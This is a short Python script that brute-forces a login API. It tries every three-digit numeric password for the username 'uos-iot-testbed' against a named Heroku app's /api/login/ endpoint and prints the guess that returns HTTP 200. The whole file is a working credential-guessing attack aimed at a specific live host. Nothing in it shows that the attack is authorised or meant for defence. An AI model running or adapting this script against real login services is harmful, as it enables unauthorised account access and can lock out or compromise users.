import itertools
import requests
import time
import json

chrs = '0123456789'
n = 3
a=[]
url = "https://blooming-mesa-20189.herokuapp.com/api/login/"
s = requests.Session()
i=0
gotit=""
for xs in itertools.product(chrs, repeat=n):
	print i
	url = "https://blooming-mesa-20189.herokuapp.com/api/login/"
	payload = {"username":"uos-iot-testbed","password":''.join(xs)}
	payload = json.dumps(payload)
	headers = {
		'content-type': "application/json",
		'cache-control': "no-cache",
		'postman-token': "c8a5cf99-4b77-fd4a-bdd6-6f6f77753481"
		}
	response = requests.request("POST", url, data=payload, headers=headers)
	if(response.status_code==400):
		print(''.join(xs) + "is not a correct password")
	elif(response.status_code==200):
		print (''.join(xs) + "is correct password")
	i=i+1